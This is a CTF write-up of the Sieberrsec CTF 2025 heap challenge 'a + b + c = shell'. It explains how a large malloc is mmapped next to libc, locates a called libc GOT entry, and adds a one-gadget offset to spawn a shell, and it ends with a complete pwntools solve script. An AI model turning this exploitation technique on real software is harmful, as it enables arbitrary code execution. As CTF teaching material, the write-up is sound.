---
id: 0
title: "Sieberrsec CTF 2025"
subtitle: "Writeups for qualifiers and finals of Sieberrsec CTF 2025"
date: "2025.07.22"
tags: "writeups"
---

This previous weekend, I had the privilege of attending both the qualifiers and finals of Sieberrsec CTF 2025, a CTF competition held by the Hwa Chong Institution (HCI) of Singapore. My team r3dw473rm3l0n5 and I managed to achieve second place in the qualifiers and fourth place in the finals.

## a + b + c = shell

> solve for shell :*
> 
> author: whywhy
>
> solves: 2

### Challenge Protections

```
[*] '/home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/chal_patched'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    Stripped:   No

[*] '/home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
```

This challenge is quite simple in design, that it exposes an interface to choose the size you wish to malloc, the offset you want to write from, and the content you want to write: 

```c
// gcc -o chal chal.c -fstack-protector-all -Wl,-z,relro,-z,now -pie -fpie

#include <stdio.h>
#include <stdlib.h>

int main() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    long long sz;
    long long off;
    long long dat;
    printf("alloc size? \n> ");
    scanf("%lld", &sz);
    printf("offset? \n> ");
    scanf("%lld", &off);
    printf("increment? \n> ");
    scanf("%lld", &dat);
    long long* buf = malloc(sz);
    *(long long*)((char*)buf+off) += dat;
    puts(NULL);
}
```

At first glance, the challenge seems nontrivial because normal heap allocations live in a separate memory region from any key attack surfaces in memory such as binary memory or libc.

```
Start              End                Size               Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000001000 0x0000000000000000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/chal_patched
0x0000555555555000 0x0000555555556000 0x0000000000001000 0x0000000000001000 r-x /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/chal_patched  <-  $rip
0x0000555555556000 0x0000555555557000 0x0000000000001000 0x0000000000002000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/chal_patched
0x0000555555557000 0x0000555555558000 0x0000000000001000 0x0000000000002000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/chal_patched  <-  $r14
0x0000555555558000 0x000055555555b000 0x0000000000003000 0x0000000000003000 rw- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/chal_patched
0x000055555555b000 0x000055555557c000 0x0000000000021000 0x0000000000000000 rw- [heap] <- not contiguous with either binary or libc
0x00007ffff7dde000 0x00007ffff7de1000 0x0000000000003000 0x0000000000000000 rw- <tls-th1>
0x00007ffff7de1000 0x00007ffff7e07000 0x0000000000026000 0x0000000000000000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/libc.so.6
0x00007ffff7e07000 0x00007ffff7f5c000 0x0000000000155000 0x0000000000026000 r-x /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/libc.so.6
0x00007ffff7f5c000 0x00007ffff7faf000 0x0000000000053000 0x000000000017b000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/libc.so.6  <-  $r10
0x00007ffff7faf000 0x00007ffff7fb3000 0x0000000000004000 0x00000000001ce000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/libc.so.6
0x00007ffff7fb3000 0x00007ffff7fb5000 0x0000000000002000 0x00000000001d2000 rw- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/libc.so.6  <-  $r8
...
```

However, it is worth noting that if a large enough size is requested from malloc, _int_malloc will mmap a separate chunk to fulfil the request, which is a constant offset from libc. This is because malloc first checks these locations for free chunks large enough to satisfy our request:

1. tcache
2. fastbins
3. smallbins, unsorted bins, largebins
4. finally, malloc decides whether to create a new chunk from the wilderness or mmap

If we request an arbitrarily large size from malloc, we will be able to coerce libc into mmaping a memory region to service our request.

Entering 1000000000 as a malloc size, we can now check our memory mappings:

```
Start              End                Size               Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000001000 0x0000000000000000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/chal_patched
0x0000555555555000 0x0000555555556000 0x0000000000001000 0x0000000000001000 r-x /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/chal_patched  <-  $rip
0x0000555555556000 0x0000555555557000 0x0000000000001000 0x0000000000002000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/chal_patched
0x0000555555557000 0x0000555555558000 0x0000000000001000 0x0000000000002000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/chal_patched  <-  $r14
0x0000555555558000 0x000055555555b000 0x0000000000003000 0x0000000000003000 rw- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/chal_patched
0x000055555555b000 0x000055555557c000 0x0000000000021000 0x0000000000000000 rw- [heap]
0x00007fffbc431000 0x00007ffff7de1000 0x000000003b9b0000 0x0000000000000000 rw- <tls-th1>  <-  $rax
0x00007ffff7de1000 0x00007ffff7e07000 0x0000000000026000 0x0000000000000000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/libc.so.6
0x00007ffff7e07000 0x00007ffff7f5c000 0x0000000000155000 0x0000000000026000 r-x /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/libc.so.6
0x00007ffff7f5c000 0x00007ffff7faf000 0x0000000000053000 0x000000000017b000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/libc.so.6
0x00007ffff7faf000 0x00007ffff7fb3000 0x0000000000004000 0x00000000001ce000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/libc.so.6
0x00007ffff7fb3000 0x00007ffff7fb5000 0x0000000000002000 0x00000000001d2000 rw- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/libc.so.6
0x00007ffff7fb5000 0x00007ffff7fc4000 0x000000000000f000 0x0000000000000000 rw-
0x00007ffff7fc4000 0x00007ffff7fc6000 0x0000000000002000 0x0000000000000000 r-- [vvar]
0x00007ffff7fc6000 0x00007ffff7fc8000 0x0000000000002000 0x0000000000000000 r-- [vvar_vclock]
0x00007ffff7fc8000 0x00007ffff7fca000 0x0000000000002000 0x0000000000000000 r-x [vdso]
0x00007ffff7fca000 0x00007ffff7fcb000 0x0000000000001000 0x0000000000000000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/ld-linux-x86-64.so.2
0x00007ffff7fcb000 0x00007ffff7ff1000 0x0000000000026000 0x0000000000001000 r-x /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/ld-linux-x86-64.so.2
0x00007ffff7ff1000 0x00007ffff7ffb000 0x000000000000a000 0x0000000000027000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/ld-linux-x86-64.so.2
0x00007ffff7ffb000 0x00007ffff7ffd000 0x0000000000002000 0x0000000000031000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/ld-linux-x86-64.so.2
0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000002000 0x0000000000033000 rw- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/ld-linux-x86-64.so.2  <-  $r15
0x00007ffffffdd000 0x00007ffffffff000 0x0000000000022000 0x0000000000000000 rw- [stack]  <-  $rbx, $rsp, $rbp, $r13
0xffffffffff600000 0xffffffffff601000 0x0000000000001000 0x0000000000000000 --x [vsyscall]
gef> x/40gx 0x00007fffbc431000
0x7fffbc431000:	0x0000000000000000	0x000000003b9ad002 <-- our mmapped allocation!
0x7fffbc431010:	0x0000000000000000	0x00000000000a0000
0x7fffbc431020:	0x0000000000000000	0x0000000000000000
0x7fffbc431030:	0x0000000000000000	0x0000000000000000
0x7fffbc431040:	0x0000000000000000	0x0000000000000000
0x7fffbc431050:	0x0000000000000000	0x0000000000000000
0x7fffbc431060:	0x0000000000000000	0x0000000000000000
0x7fffbc431070:	0x0000000000000000	0x0000000000000000
0x7fffbc431080:	0x0000000000000000	0x0000000000000000
0x7fffbc431090:	0x0000000000000000	0x0000000000000000
0x7fffbc4310a0:	0x0000000000000000	0x0000000000000000
0x7fffbc4310b0:	0x0000000000000000	0x0000000000000000
0x7fffbc4310c0:	0x0000000000000000	0x0000000000000000
0x7fffbc4310d0:	0x0000000000000000	0x0000000000000000
0x7fffbc4310e0:	0x0000000000000000	0x0000000000000000
0x7fffbc4310f0:	0x0000000000000000	0x0000000000000000
0x7fffbc431100:	0x0000000000000000	0x0000000000000000
0x7fffbc431110:	0x0000000000000000	0x0000000000000000
0x7fffbc431120:	0x0000000000000000	0x0000000000000000
0x7fffbc431130:	0x0000000000000000	0x0000000000000000
```

Since our allocation is now a constant offset from libc, our attack surface has now increased to include any target within the libc memory region.

### What can we attack?

Commonly, given an arbitrary write primitive, some common targets within LIBC would include the `__malloc_hook` and `__free_hook` regions. However, following [GLIBC version 2.32, `__malloc_hook` and `__free_hook` were deprecated. Following GLIBC 2.34 onwards, these variables were completely removed from LIBC altogether.](https://man7.org/linux/man-pages/man3/malloc_hook.3.html) This cripples a very common and trivial attack surface.

However, there are still some viable attack targets within LIBC as detailed in nobodyisnobody's [Six Different Ways - Code Execution With a Write Primitive On Last Libc](https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/README.md):
    - Libc GOT entries: viable under GLIBC 2.36 as Partial Relro is still enabled in libc binaries
    - ld.so `link_map` structure: not very viable given we have only one write/add primitive
    - FSOP via `stdout`: not viable given we have only one __QWORD__ write/add primitive
    - `__printf_arginfo_table`: not viable given `printf` is not run with a format specifier after our write
    - TLS-Storage `dtor_list` overwrite: not viable given we have only one __QWORD__ write/add primitive
    - mangled pointers in `initial` structure: not viable given we have only one __QWORD__ write/add primitive
    - pivot from LIBC to stack via leaking `environ`: ONLY ONE WRITE

With our __very limited__ primitive, given we also do not have the luxury of an information leak, this leaves us with the only viable choice of attacking the libc GOT entries - particularly by incrementing specific entries by an offset to One Gadgets.

> [One Gadgets](https://github.com/david942j/one_gadget) are gadgets in libc that lead to code paths eventually executing `execve("/bin/sh", NULL, NULL)` and similar derivatives without control of the $RDI, $RSI, and $RDX registers.

### Exploit Formulation Process

We must first find which GOT entry is executed during the course of the program after our write. Fortunately, this process is made easy with the [bata24 fork of gef](https://github.com/bata24/gef).

We can view the libc GOT with `got -f /fullpath/to/libc.so.6`:

```
----------------- PLT / GOT - /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/libc.so.6 - Partial RELRO -----------------
Name                          | PLT            | GOT            | GOT value
----------------------------------------------------------- .rela.dyn -----------------------------------------------------------
*ABS*+0xb0a60                 | Not found      | 0x7ffff7fb2028 | 0x000000000000
svc_max_pollfd                | Not found      | 0x7ffff7fb2da8 | 0x7ffff7fc19e0 <svc_max_pollfd>
obstack_alloc_failed_handler  | Not found      | 0x7ffff7fb2db0 | 0x7ffff7fb44f8 <obstack_alloc_failed_handler>
__ctype_toupper               | Not found      | 0x7ffff7fb2dc0 | 0x7ffff7fb37f0 <__ctype_toupper>
loc1                          | Not found      | 0x7ffff7fb2dd0 | 0x7ffff7fbb5d0 <loc1>
_dl_argv                      | Not found      | 0x7ffff7fb2dd8 | 0x7ffff7ffca98 <_dl_argv>
__libc_single_threaded        | Not found      | 0x7ffff7fb2de8 | 0x7ffff7fbb5d8 <__libc_single_threaded>
free                          | 0x7ffff7e07360 | 0x7ffff7fb2df0 | 0x7ffff7e79ee0 <free>
re_syntax_options             | Not found      | 0x7ffff7fb2df8 | 0x7ffff7fbb220 <re_syntax_options>
rpc_createerr                 | Not found      | 0x7ffff7fb2e00 | 0x7ffff7fc1a00 <rpc_createerr>
stdout                        | Not found      | 0x7ffff7fb2e08 | 0x555555558010 <stdout@GLIBC_2.2.5>
__ctype32_toupper             | Not found      | 0x7ffff7fb2e10 | 0x7ffff7fb37e0 <__ctype32_toupper>
opterr                        | Not found      | 0x7ffff7fb2e18 | 0x7ffff7fb3408 <opterr>
getdate_err                   | Not found      | 0x7ffff7fb2e28 | 0x7ffff7fba780 <getdate_err>
__curbrk                      | Not found      | 0x7ffff7fb2e30 | 0x7ffff7fbb338 <__curbrk>
loc2                          | Not found      | 0x7ffff7fb2e38 | 0x7ffff7fbb5c8 <loc2>
program_invocation_name       | Not found      | 0x7ffff7fb2e40 | 0x7ffff7fb4518 <program_invocation_name>
__fpu_control                 | Not found      | 0x7ffff7fb2e48 | 0x7ffff7fb31c0 <__fpu_control>
__libc_enable_secure          | Not found      | 0x7ffff7fb2e50 | 0x7ffff7ffca60 <__libc_enable_secure>
_IO_2_1_stderr_               | Not found      | 0x7ffff7fb2e58 | 0x7ffff7fb4680 <_IO_2_1_stderr_>
__rcmd_errstr                 | Not found      | 0x7ffff7fb2e60 | 0x7ffff7fbbf78 <__rcmd_errstr>
__ctype_b                     | Not found      | 0x7ffff7fb2e68 | 0x7ffff7fb3808 <__ctype_b>
error_print_progname          | Not found      | 0x7ffff7fb2e70 | 0x7ffff7fbb5a8 <error_print_progname>
stderr                        | Not found      | 0x7ffff7fb2e78 | 0x7ffff7fb4840 <stderr>
obstack_exit_failure          | Not found      | 0x7ffff7fb2e80 | 0x7ffff7fb33c8 <obstack_exit_failure>
__libc_stack_end              | Not found      | 0x7ffff7fb2e88 | 0x7ffff7ffca58 <__libc_stack_end>
__key_encryptsession_pk_LOCAL | Not found      | 0x7ffff7fb2e90 | 0x7ffff7fc1b60 <__key_encryptsession_pk_LOCAL>
_rtld_global_ro               | Not found      | 0x7ffff7fb2e98 | 0x7ffff7ffcac0 <_rtld_global_ro>
argp_program_version          | Not found      | 0x7ffff7fb2ea0 | 0x7ffff7fbbb00 <argp_program_version>
svcauthdes_stats              | Not found      | 0x7ffff7fb2ea8 | 0x7ffff7fc1ac0 <svcauthdes_stats>
__check_rhosts_file           | Not found      | 0x7ffff7fb2eb0 | 0x7ffff7fb34c8 <__check_rhosts_file>
optind                        | Not found      | 0x7ffff7fb2eb8 | 0x7ffff7fb340c <optind>
_IO_2_1_stdin_                | Not found      | 0x7ffff7fb2ec0 | 0x7ffff7fb3a80 <_IO_2_1_stdin_>
program_invocation_short_name | Not found      | 0x7ffff7fb2ec8 | 0x7ffff7fb4510 <program_invocation_short_name>
__ctype32_tolower             | Not found      | 0x7ffff7fb2ed0 | 0x7ffff7fb37e8 <__ctype32_tolower>
error_message_count           | Not found      | 0x7ffff7fb2ed8 | 0x7ffff7fbb5a4 <error_message_count>
optopt                        | Not found      | 0x7ffff7fb2ee0 | 0x7ffff7fb3404 <optopt>
__ctype32_b                   | Not found      | 0x7ffff7fb2ee8 | 0x7ffff7fb3800 <__ctype32_b>
_nl_msg_cat_cntr              | Not found      | 0x7ffff7fb2ef0 | 0x7ffff7fb4d80 <_nl_msg_cat_cntr>
__daylight                    | Not found      | 0x7ffff7fb2ef8 | 0x7ffff7fba688 <daylight>
_nl_domain_bindings           | Not found      | 0x7ffff7fb2f00 | 0x7ffff7fb4cb8 <_nl_domain_bindings>
argp_program_bug_address      | Not found      | 0x7ffff7fb2f08 | 0x7ffff7fbbaf0 <argp_program_bug_address>
_IO_funlockfile               | Not found      | 0x7ffff7fb2f10 | 0x7ffff7e32fd0 <funlockfile>
svc_fdset                     | Not found      | 0x7ffff7fb2f18 | 0x7ffff7fc1a20 <svc_fdset>
__rseq_size                   | Not found      | 0x7ffff7fb2f20 | 0x7ffff7ffca10 <__rseq_size>
stdin                         | Not found      | 0x7ffff7fb2f30 | 0x555555558020 <stdin@GLIBC_2.2.5>
__timezone                    | Not found      | 0x7ffff7fb2f38 | 0x7ffff7fba680 <timezone>
__ctype_tolower               | Not found      | 0x7ffff7fb2f40 | 0x7ffff7fb37f8 <__ctype_tolower>
_IO_2_1_stdout_               | Not found      | 0x7ffff7fb2f50 | 0x7ffff7fb4760 <_IO_2_1_stdout_>
__tzname                      | Not found      | 0x7ffff7fb2f58 | 0x7ffff7fb4500 <tzname>
error_one_per_line            | Not found      | 0x7ffff7fb2f60 | 0x7ffff7fbb5a0 <error_one_per_line>
_res_hconf                    | Not found      | 0x7ffff7fb2f68 | 0x7ffff7fbc3e0 <_res_hconf>
__key_decryptsession_pk_LOCAL | Not found      | 0x7ffff7fb2f70 | 0x7ffff7fc1b58 <__key_decryptsession_pk_LOCAL>
_rtld_global                  | Not found      | 0x7ffff7fb2f78 | 0x7ffff7ffd020 <_rtld_global>
__progname                    | Not found      | 0x7ffff7fb2f80 | 0x7ffff7fb4510 <program_invocation_short_name>
h_errlist                     | Not found      | 0x7ffff7fb2f88 | 0x7ffff7fb2260 <h_errlist>
__environ                     | Not found      | 0x7ffff7fb2f90 | 0x7ffff7fbb320 <environ>
argp_err_exit_status          | Not found      | 0x7ffff7fb2f98 | 0x7ffff7fb34c4 <argp_err_exit_status>
svc_pollfd                    | Not found      | 0x7ffff7fb2fa0 | 0x7ffff7fc19e8 <svc_pollfd>
__progname_full               | Not found      | 0x7ffff7fb2fa8 | 0x7ffff7fb4518 <program_invocation_name>
argp_program_version_hook     | Not found      | 0x7ffff7fb2fb0 | 0x7ffff7fbbb08 <argp_program_version_hook>
optarg                        | Not found      | 0x7ffff7fb2fb8 | 0x7ffff7fbb280 <optarg>
malloc                        | 0x7ffff7e07368 | 0x7ffff7fb2fc8 | 0x7ffff7e79920 <malloc>
----------------------------------------------------------- .rela.plt -----------------------------------------------------------
*ABS*+0x9f540                 | 0x7ffff7e07350 | 0x7ffff7fb3000 | 0x7ffff7f39780
*ABS*+0x9c930                 | 0x7ffff7e07020 | 0x7ffff7fb3008 | 0x7ffff7f344c0
realloc                       | 0x7ffff7e07030 | 0x7ffff7fb3010 | 0x7ffff7e07036 <.plt+0x36>
*ABS*+0x9f240                 | 0x7ffff7e07040 | 0x7ffff7fb3018 | 0x7ffff7f37280
_dl_exception_create          | 0x7ffff7e07050 | 0x7ffff7fb3020 | 0x7ffff7e07056 <.plt+0x56>
*ABS*+0x9c690                 | 0x7ffff7e07060 | 0x7ffff7fb3028 | 0x7ffff7f33930
*ABS*+0xb1350                 | 0x7ffff7e07190 | 0x7ffff7fb3030 | 0x7ffff7e84610
calloc                        | 0x7ffff7e07080 | 0x7ffff7fb3038 | 0x7ffff7e07086 <.plt+0x86>
*ABS*+0x9f7c0                 | 0x7ffff7e07090 | 0x7ffff7fb3040 | 0x7ffff7f56000
*ABS*+0x9bcf0                 | 0x7ffff7e070a0 | 0x7ffff7fb3048 | 0x7ffff7f32f80
*ABS*+0x9c580                 | 0x7ffff7e070b0 | 0x7ffff7fb3050 | 0x7ffff7f33980
*ABS*+0xb1230                 | 0x7ffff7e07220 | 0x7ffff7fb3058 | 0x7ffff7f3b2a0
*ABS*+0x9c9f0                 | 0x7ffff7e070d0 | 0x7ffff7fb3060 | 0x7ffff7f34620
*ABS*+0xb12b0                 | 0x7ffff7e070e0 | 0x7ffff7fb3068 | 0x7ffff7f3b560
_dl_find_dso_for_object       | 0x7ffff7e070f0 | 0x7ffff7fb3070 | 0x7ffff7e070f6 <.plt+0xf6>
*ABS*+0x9f490                 | 0x7ffff7e07100 | 0x7ffff7fb3078 | 0x7ffff7f38e20
*ABS*+0x9f1b0                 | 0x7ffff7e07110 | 0x7ffff7fb3080 | 0x7ffff7f37100
*ABS*+0x9cb80                 | 0x7ffff7e07120 | 0x7ffff7fb3088 | 0x7ffff7f35370
*ABS*+0x9e8d0                 | 0x7ffff7e07130 | 0x7ffff7fb3090 | 0x7ffff7f36d70
*ABS*+0xb0c50                 | 0x7ffff7e07280 | 0x7ffff7fb3098 | 0x7ffff7f39d00
*ABS*+0x9d660                 | 0x7ffff7e07150 | 0x7ffff7fb30a0 | 0x7ffff7f36620
*ABS*+0x9c7a0                 | 0x7ffff7e07160 | 0x7ffff7fb30a8 | 0x7ffff7f34080
_dl_deallocate_tls            | 0x7ffff7e07170 | 0x7ffff7fb30b0 | 0x7ffff7e07176 <.plt+0x176>
__tls_get_addr                | 0x7ffff7e07180 | 0x7ffff7fb30b8 | 0x7ffff7e07186 <.plt+0x186>
*ABS*+0xb1350                 | 0x7ffff7e07070 | 0x7ffff7fb30c0 | 0x7ffff7e84610
*ABS*+0x9bd70                 | 0x7ffff7e071a0 | 0x7ffff7fb30c8 | 0x7ffff7f33220
*ABS*+0x9f2e0                 | 0x7ffff7e071b0 | 0x7ffff7fb30d0 | 0x7ffff7f37290
_dl_fatal_printf              | 0x7ffff7e071c0 | 0x7ffff7fb30d8 | 0x7ffff7e071c6 <.plt+0x1c6>
*ABS*+0x9d560                 | 0x7ffff7e071d0 | 0x7ffff7fb30e0 | 0x7ffff7f35d70
*ABS*+0xb0d70                 | 0x7ffff7e071e0 | 0x7ffff7fb30e8 | 0x7ffff7f50700
*ABS*+0x9e950                 | 0x7ffff7e071f0 | 0x7ffff7fb30f0 | 0x7ffff7f53370
*ABS*+0x9cae0                 | 0x7ffff7e07200 | 0x7ffff7fb30f8 | 0x7ffff7f35360
*ABS*+0x9f3f0                 | 0x7ffff7e07210 | 0x7ffff7fb3100 | 0x7ffff7f387d0
*ABS*+0xb1230                 | 0x7ffff7e070c0 | 0x7ffff7fb3108 | 0x7ffff7f3b2a0
*ABS*+0x9ca70                 | 0x7ffff7e07230 | 0x7ffff7fb3110 | 0x7ffff7f349d0
*ABS*+0xb0ce0                 | 0x7ffff7e07240 | 0x7ffff7fb3118 | 0x7ffff7f39f40
_dl_audit_symbind_alt         | 0x7ffff7e07250 | 0x7ffff7fb3120 | 0x7ffff7e07256 <.plt+0x256>
*ABS*+0x9f600                 | 0x7ffff7e07260 | 0x7ffff7fb3128 | 0x7ffff7f39a50
*ABS*+0x9d5e0                 | 0x7ffff7e07270 | 0x7ffff7fb3130 | 0x7ffff7f363e0
*ABS*+0xb0c50                 | 0x7ffff7e07140 | 0x7ffff7fb3138 | 0x7ffff7f39d00
*ABS*+0x9be60                 | 0x7ffff7e07290 | 0x7ffff7fb3140 | 0x7ffff7f33980
_dl_rtld_di_serinfo           | 0x7ffff7e072a0 | 0x7ffff7fb3148 | 0x7ffff7e072a6 <.plt+0x2a6>
_dl_allocate_tls              | 0x7ffff7e072b0 | 0x7ffff7fb3150 | 0x7ffff7e072b6 <.plt+0x2b6>
__tunable_get_val             | 0x7ffff7e072c0 | 0x7ffff7fb3158 | 0x7ffff7fde010 <__tunable_get_val>
*ABS*+0xb0e20                 | 0x7ffff7e072d0 | 0x7ffff7fb3160 | 0x7ffff7f3a460
*ABS*+0x9c830                 | 0x7ffff7e072e0 | 0x7ffff7fb3168 | 0x7ffff7f34380
*ABS*+0xb24e0                 | 0x7ffff7e072f0 | 0x7ffff7fb3170 | 0x7ffff7f3ac80
*ABS*+0x9d6f0                 | 0x7ffff7e07300 | 0x7ffff7fb3178 | 0x7ffff7f36810
_dl_allocate_tls_init         | 0x7ffff7e07310 | 0x7ffff7fb3180 | 0x7ffff7e07316 <.plt+0x316>
__nptl_change_stack_perm      | 0x7ffff7e07320 | 0x7ffff7fb3188 | 0x7ffff7e07326 <.plt+0x326>
*ABS*+0x9f5d0                 | 0x7ffff7e07330 | 0x7ffff7fb3190 | 0x7ffff7f55f10
_dl_audit_preinit             | 0x7ffff7e07340 | 0x7ffff7fb3198 | 0x7ffff7fe0a10 <_dl_audit_preinit>
*ABS*+0x9f540                 | 0x7ffff7e07010 | 0x7ffff7fb31a0 | 0x7ffff7f39780
```

"But there are so many entries..", you may say, "how do we find which specific one is executed? Surely we must be meticulous about this, devote our fullest energies to this cau-"

---

```
set $addr = 0x7ffff7fb3000
while $addr < 0x7ffff7fb31a8
    set {char}$addr = 0
    set $addr = $addr + 1
end
```

---

```
$rsp  0x7fffffffa9b8|+0x0000|+000: 0x00007ffff7e3d4a0  ->  0x44c600008000e581
      0x7fffffffa9c0|+0x0008|+001: 0x0000555555556019  ->  0x203f74657366666f 'offset? \n> '  <-  $rdi
      0x7fffffffa9c8|+0x0010|+002: 0x0000000000000000
      0x7fffffffa9d0|+0x0018|+003: 0x0000000000000d68 ('h\r'?)
      0x7fffffffa9d8|+0x0020|+004: 0x0000000000000000
      0x7fffffffa9e0|+0x0028|+005: 0x0000000000000000
      0x7fffffffa9e8|+0x0030|+006: 0x0000000000000000
      0x7fffffffa9f0|+0x0038|+007: 0x0000000000000000
-------------------------------------------------------------------------------------------------- code: x86:64 (gdb-native) ----
=> 0x0:	[!] Cannot access memory at address 0x0
-------------------------------------------------------------------------------------------------------------- memory access ----
[!] Cannot access memory at address 0x0
-------------------------------------------------------------------------------------------------- threads (shown:4 / all:1) ----
[*Thread Id:1, tid:78789] Name: "chal_patched", stopped at 0x000000000000 <NO_SYMBOL>, reason: SIGSEGV
---------------------------------------------------------------------------------------------------------------------- trace ----
[*#0] 0x000000000000 <NO_SYMBOL>
[ #1] 0x7ffff7e3d4a0 <NO_SYMBOL>
[ #2] 0x7ffff7e3f8ed <NO_SYMBOL>
[ #3] 0x7ffff7e3365b <printf+0xab>
[ #4] 0x55555555520b <main+0x82>
[ #5] 0x7ffff7e0824a <NO_SYMBOL>
[ #6] 0x7ffff7e08305 <__libc_start_main+0x85>
[ #7] 0x5555555550c1 <_start+0x21>
---------------------------------------------------------------------------------------------------------------------------------
gef> bt
#0  0x0000000000000000 in ?? ()
#1  0x00007ffff7e3d4a0 in ?? () from ./libc.so.6
#2  0x00007ffff7e3f8ed in ?? () from ./libc.so.6
#3  0x00007ffff7e3365b in printf () from ./libc.so.6
#4  0x000055555555520b in main ()
#5  0x00007ffff7e0824a in ?? () from ./libc.so.6
#6  0x00007ffff7e08305 in __libc_start_main () from ./libc.so.6
#7  0x00005555555550c1 in _start ()
```
---

The lion does not work hard for pwn.

We can view the first few instructions before #1 with `x/40i 0x00007ffff7e3d4a0-0x40`:

```
0x7ffff7e3d460:	add    BYTE PTR [rax],al
0x7ffff7e3d462:	cmp    QWORD PTR [rsp],0x0
0x7ffff7e3d467:	je     0x7ffff7e3f710
0x7ffff7e3d46d:	test   bpl,0x2
0x7ffff7e3d471:	jne    0x7ffff7e3e918
0x7ffff7e3d477:	movdqu xmm1,XMMWORD PTR [r12]
0x7ffff7e3d47d:	mov    rdi,QWORD PTR [rsp]
0x7ffff7e3d481:	mov    esi,0x25
0x7ffff7e3d486:	movups XMMWORD PTR [rsp+0xe8],xmm1
0x7ffff7e3d48e:	mov    rax,QWORD PTR [r12+0x10]
0x7ffff7e3d493:	mov    QWORD PTR [rsp+0xf8],rax
0x7ffff7e3d49b:	call   0x7ffff7e07150 <*ABS*+0x9d660@plt>
```

To then finally get the GOT entry that is called:

```
gef> disas 0x7ffff7e07150
Dump of assembler code for function *ABS*+0x9d660@plt:
   0x00007ffff7e07150 <+0>:	jmp    QWORD PTR [rip+0x1abf4a]        # 0x7ffff7fb30a0 <*ABS*@got.plt>
   0x00007ffff7e07156 <+6>:	push   0x24
   0x00007ffff7e0715b <+11>:	jmp    0x7ffff7e07000
End of assembler dump.
gef>
```

The rest of the exploit then boils down to selecting the correct one gadget, finding the offset of the one gadget from the original GOT entry, finding the offset of the GOT entry from our mmap chunk, and then adding the one gadget offset to the GOT entry to trigger our shell:

```
❯ python3 solve.py
[*] '/home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/chal_patched'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    Stripped:   No
[*] '/home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
[*] '/home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/ld-linux-x86-64.so.2'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
[+] Starting local process '/home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/chal_patched': pid 77574
[DEBUG] Received 0xf bytes:
    b'alloc size? \n'
    b'> '
[DEBUG] Sent 0x8 bytes:
    b'1000000\n'
[DEBUG] Received 0xb bytes:
    b'offset? \n'
    b'> '
[DEBUG] Sent 0x8 bytes:
    b'2924656\n'
[DEBUG] Received 0xe bytes:
    b'increment? \n'
    b'> '
[DEBUG] Sent 0x8 bytes:
    b'-528289\n'
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x51 bytes:
    b'chal\tchal_patched  ld-linux-x86-64.so.2  solve.py\n'
    b'chal.c\tDockerfile    libc.so.6\n'
chal	chal_patched  ld-linux-x86-64.so.2  solve.py
chal.c	Dockerfile    libc.so.6
$
```

Profit!!

### Full solve script

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./chal_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf
context.log_level = 'debug'
context.terminal = 'kitty'

p = process()
# gdb.attach(p)
# p = remote('chal2.sieberr.live', 15007)

# As easy as a + b + c = shell!
p.sendlineafter(b'size? \n> ', b'1000000')
p.sendlineafter(b'offset? \n> ', str(0x2ca070).encode())
p.sendlineafter(b'increment? \n> ', str(-0x80fa1).encode())

p.interactive()
```
